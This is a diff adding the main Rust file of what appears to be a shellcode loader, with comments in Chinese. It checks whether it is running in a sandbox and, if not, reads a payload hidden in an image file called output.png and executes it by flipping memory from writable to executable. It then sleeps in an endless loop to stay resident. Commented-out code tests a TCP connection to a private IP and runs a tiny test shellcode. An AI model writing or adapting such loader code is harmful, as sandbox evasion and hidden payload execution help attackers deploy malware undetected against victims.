@@ -1,0 +1,53 @@
+mod tcp;
+mod sandbox;
+use sysinfo::System;
+mod img;
+mod exec;
+use std::time::Duration;
+use std::thread;
+
+const IMG_PATH:&str="output.png";
+
+// const IP:&str="10.190.89.125:1124";
+fn main(){
+    let mut sys=System::new_all();
+    sys.refresh_memory();
+    
+    // let tcp_res=tcp::test_tcp(&sys,IP);
+    // match tcp_res {
+    //     Ok(())=>{println!("OK!");},
+    //     Err(err)=>{println!("{}",err);}
+    // }
+
+    let is_sandbox=sandbox::is_sandbox(&sys);
+    if is_sandbox{
+        println!("是沙箱!");
+    }else{
+        let res=img::read(IMG_PATH);
+        unsafe {
+            if let Err(e) = exec::execute_shellcode_rw_to_rx(&res) {
+                eprintln!("执行失败: {}", e);
+            }
+        }
+        loop {
+        thread::sleep(Duration::from_secs(3600));  // 每小时醒一次，不占用 CPU
+        }
+        // println!("不是沙箱!");
+    }
+}
+
+// main.rs
+// fn main() {
+//     // 最简测试：ret 指令
+//     let test_sc = vec![
+//         0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1
+//         0xC3,                         // ret
+//     ];
+
+//     unsafe {
+//         match exec::execute_shellcode_rw_to_rx(&test_sc) {
+//             Ok(_) => println!("[*] 执行成功"),
+//             Err(e) => eprintln!("[-] 失败: {}", e),
+//         }
+//     }
+// }
